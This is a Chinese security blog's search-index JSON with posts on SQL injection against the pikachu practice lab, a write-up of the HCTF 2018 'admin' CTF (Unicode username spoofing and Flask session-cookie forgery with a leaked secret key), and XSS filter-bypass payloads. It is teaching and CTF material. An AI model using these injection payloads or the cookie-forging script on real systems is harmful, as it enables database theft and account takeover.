[{"title":"Hello World","url":"/2021/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","categories":["World"],"tags":["Hello"]},{"title":"SQL-SQL注入基础","url":"/2021/SQL-SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","content":"SQL-SQL注入基础SQL注入即开发者对用户输入参数没有做到严格过滤，导致用户输入数据能够影响预设的查询功能\n通常表现为数据库原有信息被泄露、篡改，甚至删除\nUNION注入-数字型注入前提：用户通过传入的id等参数，可以从数据库中查询相应的记录\n对字符型注入的判断：判断输入值有无数字运算的特征行为\n例如：输入id=2与id=3-1得到的反馈是相同的，即该注入点为数字型注入\n以pikachu漏洞练习平台上题目为例\nSQL-Inject/数字型注入（post）\n使用BURPSUITE修改post请求\nid=3\n\nid=5-2\n\n可见id值为“3”与id值为“5-2”所得反馈相同\n即该注入点为数字型注入\n使用UNION并入SQL查询语句来干扰正常查询\n在确定为数字型注入后，使用order by 1-99语句查询该数据表的字段数量\nid=1 order by 2\n\n返回界面与id=1时相同\nid=1 order by 3\n\n出现了错误\n即在该环境中，通过order by查询得到的字段数为2\n故union注入的语句如下：\nunion select 1,2\n\n访问id=1 union select 1,2\n\n既执行了id=1的查询，也执行了union后的查询\n指定id=-1或一个很大的值，使其无法正常执行原查询，则会执行union后的查询\n将union select 1,2中的1或2修改成需要的查询语句\n例如：\nid=-1 union select 1,database()或id=-1 union select database(),2\n\ndatabase()函数用于查询当前数据库名，即可得到该数据库名为“pikachu“\n\n之后可通过修改查询语句进行对数据库的查询\n查询表名\nid=-1 union select 1,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27;\n\n这里只显示第一项记录\n\n在原有数据后面加上”limit 1,1“参数即可显示第二条记录\nid=-1 union select 1,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 1,1\n\n”limit 1,1“即为条件限定，取查询结果第一条记录的后一条记录\n\n同理”limit 2,1“为限定查询结果第二条记录的后一条记录\n同理”limit 0,100“为限定查询结果的前一百条记录\nid=-1 union select 1,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,100\n\n\n亦可使用”group_concat“来用”,“联合多行记录\nid=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #查询所有表名或id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27; #查询“pikachu”库下所有表名\n\n\n继续查询所需要的\nid=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;member&#x27;id=-1 union select username,email from member\n\n最后查询对应的”username“与”email“即可\n\nUNION注入-字符型注入GET参数输入的地方包裹单引号，变成字符串\n注入方式：尝试闭合前面单引号，且注释后面的语句\n即：使用单引号闭合前面单引号，使用注释符号注释后面语句\n常用注释：”#“、”/**/“\n构造时应使用符号的url编码\n空格：”%20“，”#“：”%23“，”‘“：”%27“\nurl中构造\nkobe%27union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23\n\n结果如下：\n\n修改union后面的查询语句即可继续查询所需的内容\n报错注入利用页面报错信息获取数据\n常用于报错注入的函数：\n\nupdatexml()： MySQL对XML文档数据进行查询和修改的XPATH函数\nextractvalue()：MySQL对XML文档数据进行查询的XPATH函数\nfloor()：MySQL中用来取整的函数\n\nUPDATEXML (XML_document, XPath_string, new_value);\n\n第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc\n第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程\n第三个参数：new_value，String格式，替换查找到的符合条件的数据\n作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值\n\n测试题：pikachu漏洞练习平台/数字型注入(post)\n通过报错信息查询数据库名称\nid=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)\n\n\n将database()函数替换为其他查询语句即可\n布尔盲注通过注入得到的真假回显推测出数据\n测试环境：pikachu漏洞练习平台\n添加”and“，”and“两边需同时满足查询才可执行\n测试题：pikachu漏洞练习平台/数字型注入(post)\n判断数据库名的长度\nid=1 and length(database())&gt;=7\n\n执行成功\nid=1 and length(database())&gt;=8\n\n不能执行\n上文可知该数据库名为”pikachu“，为7位字符\n判断数据库的名称\nid=1 and substr(database(),1,1)&gt;&#x27;a&#x27;\n\n执行成功\nsubstr()函数功能为截取，“1,1”即截取database()中从第一个开始字符，返回一个字符，这点与limit不同\n即可使用二分法去猜测字符\nid=1 and substr(database(),1,1)&gt;&#x27;p&#x27;\n\n执行成功\nMySQL自带的截取函数：substring(),mid(),substr()\n将database()函数换成其他查询语句，即可查询所需\n如若改变测试题为：pikachu漏洞练习平台/字符型注入(get)\nget型要注意url编码,而字符型需要构造闭合，且需要注释，故构造如下\nkobe%27%20and%20length(database())&gt;1%23\n\n执行成功\n其他具体查询就与前文类似\n在数字型与字符型分别访问以下两个\nid= 1 or 1=1kobe%27%20or%201=1%23\n\n由于1=1是永真条件，页面定能执行，返回出来的东西还会有惊喜\n时间盲注某些情况下页面回显内容是完全一致的，可通过增加语句执行时需要等待的时间来判断查询是否为有效查询\n测试题：pikachu漏洞练习平台/字符型注入(get)\n访问\nkobe&#x27; and sleep(3)#\n\n后台等待三秒才开始执行\n\n判断数据库名\nkobe&#x27; and if((substr(database(), 1, 1))=&#x27;p&#x27;, sleep(3), null)#\n\n延迟了三秒，证明查询成功，数据库名第一个字母为“p”\n可通过这种特性，查询所需内容，具体与布尔盲注类似\n总结注入技巧使用优先级是：UNION注入&gt;报错注入&gt;布尔盲注&gt;时间盲注\n","categories":["CTF-WEB"],"tags":["SQL"]},{"title":"BUUCTF-[HCTF 2018]admin","url":"/2021/BUUCTF-%5BHCTF%202018%5Dadmin/","content":"[HCTF 2018]admin进入界面：\n没注册的时候有”login”,”register”两个选项\n\n随随便便就给它注册一个\n诶，这回选择就多了\n可以”index”,”post”,”change password”,”logout”\n\n几次尝试：由提示”admin”入手提示为admin\n那我就乖乖地注册一个admin账户\n哦吼，我滴乖乖\n已经被注册了\n\n那说明什么，这个admin账户指定有点东西\n首先想到的是使用BURPSUITE进行密码爆破\n很显然，似乎是不能爆破，具体原因我不清楚，待大佬指点，记一坑，日后填\n依然由”admin”开始操作，改变大小写注册”Admin”账户假装我是”admin”，以失败告终\n正确姿势进行修改密码时，查看网页源代码\n可以发现提供题目源码的地址\nhttps:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F;\n\n源码如下：\n#!/usr/bin/env python# -*- coding:utf-8 -*-from flask import Flask, render_template, url_for, flash, request, redirect, session, make_responsefrom flask_login import logout_user, LoginManager, current_user, login_userfrom app import app, dbfrom config import Configfrom app.models import Userfrom forms import RegisterForm, LoginForm, NewpasswordFormfrom twisted.words.protocols.jabber.xmpp_stringprep import nodeprepfrom io import BytesIOfrom code import get_verify_code@app.route(&#x27;/code&#x27;)def get_code():    image, code = get_verify_code()    # 图片以二进制形式写入    buf = BytesIO()    image.save(buf, &#x27;jpeg&#x27;)    buf_str = buf.getvalue()     # 把buf_str作为response返回前端，并设置首部字段    response = make_response(buf_str)    response.headers[&#x27;Content-Type&#x27;] = &#x27;image/gif&#x27;    # 将验证码字符串储存在session中    session[&#x27;image&#x27;] = code    return response@app.route(&#x27;/&#x27;)@app.route(&#x27;/index&#x27;)def index():    return render_template(&#x27;index.html&#x27;, title = &#x27;hctf&#x27;)@app.route(&#x27;/register&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def register():    if current_user.is_authenticated:        return redirect(url_for(&#x27;index&#x27;))    form = RegisterForm()    if request.method == &#x27;POST&#x27;:        name = strlower(form.username.data)        if session.get(&#x27;image&#x27;).lower() != form.verify_code.data.lower():            flash(&#x27;Wrong verify code.&#x27;)            return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form=form)        if User.query.filter_by(username = name).first():            flash(&#x27;The username has been registered&#x27;)            return redirect(url_for(&#x27;register&#x27;))        user = User(username=name)        user.set_password(form.password.data)        db.session.add(user)        db.session.commit()        flash(&#x27;register successful&#x27;)        return redirect(url_for(&#x27;login&#x27;))    return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form = form)@app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def login():    if current_user.is_authenticated:        return redirect(url_for(&#x27;index&#x27;))    form = LoginForm()    if request.method == &#x27;POST&#x27;:        name = strlower(form.username.data)        session[&#x27;name&#x27;] = name        user = User.query.filter_by(username=name).first()        if user is None or not user.check_password(form.password.data):            flash(&#x27;Invalid username or password&#x27;)            return redirect(url_for(&#x27;login&#x27;))        login_user(user, remember=form.remember_me.data)        return redirect(url_for(&#x27;index&#x27;))    return render_template(&#x27;login.html&#x27;, title = &#x27;login&#x27;, form = form)@app.route(&#x27;/logout&#x27;)def logout():    logout_user()    return redirect(&#x27;/index&#x27;)@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def change():    if not current_user.is_authenticated:        return redirect(url_for(&#x27;login&#x27;))    form = NewpasswordForm()    if request.method == &#x27;POST&#x27;:        name = strlower(session[&#x27;name&#x27;])        user = User.query.filter_by(username=name).first()        user.set_password(form.newpassword.data)        db.session.commit()        flash(&#x27;change successful&#x27;)        return redirect(url_for(&#x27;index&#x27;))    return render_template(&#x27;change.html&#x27;, title = &#x27;change&#x27;, form = form)@app.route(&#x27;/edit&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def edit():    if request.method == &#x27;POST&#x27;:                flash(&#x27;post successful&#x27;)        return redirect(url_for(&#x27;index&#x27;))    return render_template(&#x27;edit.html&#x27;, title = &#x27;edit&#x27;)@app.errorhandler(404)def page_not_found(error):    title = unicode(error)    message = error.description    return render_template(&#x27;errors.html&#x27;, title=title, message=message)def strlower(username):    username = nodeprep.prepare(username)    return username\n\nUnicode欺骗观察源码\n在末尾定义了一个函数 strlower() \ndef strlower(username):    username = nodeprep.prepare(username)    return username\n\n这个函数在注册、登录、修改密码中都存在\n\n函数主体中 username = nodeprep.prepare(username) \n观察源码第十行 from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep \nnodeprep是从Twisted模块导入\n打开项目的requirements.txt\nFlask==0.10.1Werkzeug==0.10.4Flask_Login==0.4.1Twisted==10.2.0Flask_SQLAlchemy==2.0WTForms==2.2.17 Flask_Migrate==2.2.18 Flask_WTF==0.14.29 Pillow==5.3.0pymysql==0.9.2\n\n其中 Twisted==10.2.0 \n与官网的版本相比较，已是非常古老\n\n利用古老版本的漏洞来作为这一题的突破口\n而这里面就存在Unicode编码的一个问题\n可以知道当使用了nodeprep.prepare()函数之后，如果我们先使用unicode的编码的字符，比如说 ᴬ ，使用该函数之后，他会先变成大写的A，再使用一次就会变成小写的a\n具体字符可查这\n\n下面是我自己使用python尝试了一下项目中的编译\n其中Unicode编码 \\u1d2c\\u1d30\\u1d39\\u1d35\\u1d3a 为”ᴬᴰᴹᴵᴺ”的unicode编码\n\n报错为 raise UnicodeError(“Unassigned code point %s” % repr(c)) 具体问题排查中\n注册”ᴬᴰᴹᴵᴺ”账号\n\n登录进去，猛如虎一顿操作，改一个我的小脑袋瓜子能够记得住的密码\n\n退出该账号\n通过”admin”进行登录\n输入”ᴬᴰᴹᴵᴺ”账号的密码即可进入\n悄咪咪地溜进去悄咪咪地拿到flag最后悄咪咪地走人\n\nSession伪造以下是来自学长的指点：\n\n服务器端是通过seesion区分用户的 \n如果你解密你的seesion\n然后添加管理员权限的标记 \n再加密回去 \n服务器就会认为你是admin\n\n这题的session是存在于本地\n由资料中的文章知flask的session是存在客户端\n随便注册一个账号”beacon”\n登录进去，拿到session\n\n通过以下代码进行解码：\n#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)    payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1)    decompress = False    if payload.startswith(b&#x27;.&#x27;):        payload = payload[1:]        decompress = True    try:        payload = base64_decode(payload)    except Exception as e:        raise Exception(&#x27;Could not base64 decode the payload because of an exception&#x27;)    if decompress:        try:            payload = zlib.decompress(payload)        except Exception as e:            raise Exception(&#x27;Could not zlib decompress the payload before decoding the payload&#x27;)    return session_json_serializer.loads(payload)if __name__ == &#x27;__main__&#x27;:    print(decryption(str(input(&quot;输入需要解码的Session:&quot;)).encode() ))\n\n解码情况如下：\n\n解码完成之后就是伪造session\n伪造session需要SECRET_KEY\n在项目文件中可以找到\nimport osclass Config(object):    SECRET_KEY = os.environ.get(&#x27;SECRET_KEY&#x27;) or &#x27;ckj123&#x27;    SQLALCHEMY_DATABASE_URI = &#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;    SQLALCHEMY_TRACK_MODIFICATIONS = True\n\nSECRET_KEY为”ckj123&quot;\n“name”由”beacon”修改为”admin”\n进行session加密\n加密代码如下（取自GitHub）\n#!/usr/bin/env python3&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;__author__ = &#x27;Wilson Sumanang, Alexandre ZANNI&#x27;# standard importsimport sysimport zlibfrom itsdangerous import base64_decodeimport ast# Abstract Base Classes (PEP 3119)if sys.version_info[0] &lt; 3: # &lt; 3.0    raise Exception(&#x27;Must be using at least Python 3&#x27;)elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4    from abc import ABCMeta, abstractmethodelse: # &gt; 3.4    from abc import ABC, abstractmethod# Lib for argument parsingimport argparse# external Importsfrom flask.sessions import SecureCookieSessionInterfaceclass MockApp(object):    def __init__(self, secret_key):        self.secret_key = secret_keyif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4    class FSCM(metaclass=ABCMeta):        def encode(secret_key, session_cookie_structure):            &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;            try:                app = MockApp(secret_key)                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))                si = SecureCookieSessionInterface()                s = si.get_signing_serializer(app)                return s.dumps(session_cookie_structure)            except Exception as e:                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)                raise e        def decode(session_cookie_value, secret_key=None):            &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;            try:                if(secret_key==None):                    compressed = False                    payload = session_cookie_value                    if payload.startswith(&#x27;.&#x27;):                        compressed = True                        payload = payload[1:]                    data = payload.split(&quot;.&quot;)[0]                    data = base64_decode(data)                    if compressed:                        data = zlib.decompress(data)                    return data                else:                    app = MockApp(secret_key)                    si = SecureCookieSessionInterface()                    s = si.get_signing_serializer(app)                    return s.loads(session_cookie_value)            except Exception as e:                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)                raise eelse: # &gt; 3.4    class FSCM(ABC):        def encode(secret_key, session_cookie_structure):            &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;            try:                app = MockApp(secret_key)                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))                si = SecureCookieSessionInterface()                s = si.get_signing_serializer(app)                return s.dumps(session_cookie_structure)            except Exception as e:                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)                raise e        def decode(session_cookie_value, secret_key=None):            &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;            try:                if(secret_key==None):                    compressed = False                    payload = session_cookie_value                    if payload.startswith(&#x27;.&#x27;):                        compressed = True                        payload = payload[1:]                    data = payload.split(&quot;.&quot;)[0]                    data = base64_decode(data)                    if compressed:                        data = zlib.decompress(data)                    return data                else:                    app = MockApp(secret_key)                    si = SecureCookieSessionInterface()                    s = si.get_signing_serializer(app)                    return s.loads(session_cookie_value)            except Exception as e:                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)                raise eif __name__ == &quot;__main__&quot;:    # Args are only relevant for __main__ usage        ## Description for help    parser = argparse.ArgumentParser(                description=&#x27;Flask Session Cookie Decoder/Encoder&#x27;,                epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)    ## prepare sub commands    subparsers = parser.add_subparsers(help=&#x27;sub-command help&#x27;, dest=&#x27;subcommand&#x27;)    ## create the parser for the encode command    parser_encode = subparsers.add_parser(&#x27;encode&#x27;, help=&#x27;encode&#x27;)    parser_encode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,                                help=&#x27;Secret key&#x27;, required=True)    parser_encode.add_argument(&#x27;-t&#x27;, &#x27;--cookie-structure&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,                                help=&#x27;Session cookie structure&#x27;, required=True)    ## create the parser for the decode command    parser_decode = subparsers.add_parser(&#x27;decode&#x27;, help=&#x27;decode&#x27;)    parser_decode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,                                help=&#x27;Secret key&#x27;, required=False)    parser_decode.add_argument(&#x27;-c&#x27;, &#x27;--cookie-value&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,                                help=&#x27;Session cookie value&#x27;, required=True)    ## get args    args = parser.parse_args()    ## find the option chosen    if(args.subcommand == &#x27;encode&#x27;):        if(args.secret_key is not None and args.cookie_structure is not None):            print(FSCM.encode(args.secret_key, args.cookie_structure))    elif(args.subcommand == &#x27;decode&#x27;):        if(args.secret_key is not None and args.cookie_value is not None):            print(FSCM.decode(args.cookie_value,args.secret_key))        elif(args.cookie_value is not None):            print(FSCM.decode(args.cookie_value))\n\n执行\npython .\\flask_session_cookie_manager.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;3fbbbd4cf0447592eac22fe47104c884df13b3eb75f93a47a15ca80c53c2de846e6606703cb8d1e9bd9ec0f9f124d9edcfc909583cfc8c42fe7eaeca159441ab&#x27;, &#x27;csrf_token&#x27;: b&#x27;ade7afede008694bd78e9ab33291242fb3d9d3d4&#x27;, &#x27;image&#x27;: b&#x27;6xVv&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;\n\n将原session修改成伪造后的session值即可\n\n资料网上一题三解：三种本题解法\nUnicode查询：Unicode character table\nSession相关：session\nSession加密：Session加密\n","categories":["CTF-WEB"],"tags":["练习记录"]},{"title":"XSS-XSS基础","url":"/2021/XSS-XSS%E5%9F%BA%E7%A1%80/","content":"XSS-XSS基础XSS攻击即为跨站脚本攻击（Cross Site Scripting）\n\n通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。\n\n前端漏洞，受害者为前端用户\n攻击原理\nHTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是HTML标签的开始，与之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。\n\n特点XSS相比于钓鱼网站危害更大\nXSS具有以下特点：\n\n①由于XSS攻击在用户当前使用的应用程序中执行，用户将会看到与其有关的个性化信息，如账户信息或“欢迎回来”消息，克隆的Web站点不会显示个性化信息。\n②通常，在钓鱼攻击中使用的克隆Web站点一经发现，就会立即被关闭。\n③许多浏览器与安全防护软件产品都内置钓鱼攻击过滤器，可阻止用户访问恶意的克隆站点。\n④如果客户访问一个克隆的Web网银站点，银行一般不承担责任。但是，如果攻击者通过银行应用程序中的XSS漏洞攻击了银行客户，则银行将不能简单地推卸责任。\n\n类型按攻击代码的工作方式分：\n1.持久行跨站（存储型）：\n  最直接的危害类型，跨站代码储存在服务器（数据库）\n  永久性储存\n2.非持久型跨站（反射型）：\n  反射型跨站脚本漏洞，最普遍的类型\n  一次性\n3.DOM跨站（DOM XSS）：\n  通过DOM操作前端代码输出时产生\n  一次性\n\n基于DOM的XSS漏洞是指受害者端的网页脚本在修改本地页面DOM环境时未进行合理的处置，而使得攻击脚本被执行。在整个攻击过程中，服务器响应的页面并没有发生变化，引起客户端脚本执行结果差异的原因是对本地DOM的恶意篡改利用。\n\n形成原因XSS漏洞形成的主要原因是程序对于输入与输出没有做到严格的把控导致攻击脚本被当作有效代码执行\nXSS漏洞测试流程\n① 在目标上找输入点，比如查询接口、留言板\n② 输入一组 “特殊字符（&gt;，’，”等）+唯一识别字符” ，点击提交后，查看返回源码，看后端返回的数据是否有处理\n③ 通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的条件（构造闭合）\n④ 提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执行则说明存在XSS漏洞\n\n常用XSS攻击手段与目的\n1、盗用cookie，获取敏感信息。\n2、利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。\n3、利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。\n4、利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。\n5、在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。\n\nXSS基础过滤1.抓包重新插入，或修改前端HTML代码\n2.修改大小写，若正则匹配只匹配小写，则可绕过\n3.双写（拼凑），例如\n&lt;scri&lt;script&gt;pt&gt;alert(111)&lt;/scri&lt;/script&gt;pt&gt;\n\n后台即使过滤script，也有只过滤一次的可能\n4.注释干扰，例如\n&lt;scri&lt;!--test--&gt;pt&gt;alert(111)&lt;/sc&lt;!--test--&gt;ript&gt;\n\n加上注释后，有绕过后台过滤机制的可能\n5.编码，例 \n&lt;img src=x onerror=alert(&#x27;xss&#x27;)&gt; \n\n经过HTML编码为：\n&lt;img src=x onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;&gt; \n\n练习反射型xss（get or post）先判断有无过滤，然后写入xss代码\n示例：\n&lt;script&gt;alert(&quot;BEACON&quot;)&lt;/script&gt; \n\n存储型xss寻找输入点，然后进行xss攻击\nDOM型XSS例一：\n我们先通过 “&gt; 闭合了herf标签，然后再插入相应的payload\n根据提示构造payload ‘\n&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt; \n\n例二：\n与前面不同的是，前面通过 getElementById 获取到了标签 Id 为 text的内容赋值给str\n然后又把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，a标签会写到 Id 为 dom的 div 标签中\n这里则是定义了一个domxss函数\n利用 window.location.search 获取浏览器中URL的内容，然后赋值给 str\n然后经过URL解码和字符串分隔，取出URL中的参数内容\n再把 “+” 替换为 “ ”（空格），赋值给 xss\n最后把 xss 拼接到 a 标签中，然后写到 Id 为 dom 的 div 标签中\n跟前面的DOM不同的是，它的输入是从浏览器的URL中获取的\n附基于pikachu漏洞练习平台关于XSS介绍与练习\n","categories":["CTF-WEB"],"tags":["XSS"]}]